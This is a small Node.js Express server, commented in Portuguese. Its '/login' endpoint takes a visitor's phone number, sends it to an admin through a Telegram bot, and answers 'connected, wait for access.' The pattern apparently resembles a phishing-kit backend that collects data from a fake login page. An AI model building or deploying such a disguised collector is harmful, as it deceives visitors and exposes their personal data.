require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const { Telegraf } = require('telegraf');

const app = express();
const port = 3000;

app.use(bodyParser.json());
app.use(express.static(__dirname));

const bot = new Telegraf(process.env.TELEGRAM_TOKEN);

// Endpoint para receber número de telefone e enviar para o admin
app.post('/login', async (req, res) => {
  const { phone } = req.body;

  if (!phone) {
    return res.status(400).json({ success: false, message: 'Número inválido.' });
  }

  const msg = `📲 Novo usuário conectado:\nNúmero: ${phone}`;

  try {
    await bot.telegram.sendMessage(process.env.CHAT_ID, msg);
    res.json({ success: true, message: 'Conectado com sucesso! Aguarde o acesso.' });
  } catch (error) {
    console.error('Erro ao enviar para Telegram:', error.message);
    res.status(500).json({ success: false, message: 'Erro interno. Tente novamente.' });
  }
});

// Manter servidor ativo
setInterval(() => {
  console.log('🔄 Servidor ativo...');
}, 30000);

app.listen(port, () => {
  console.log(`🌐 Servidor rodando em http://localhost:${port}`);
});
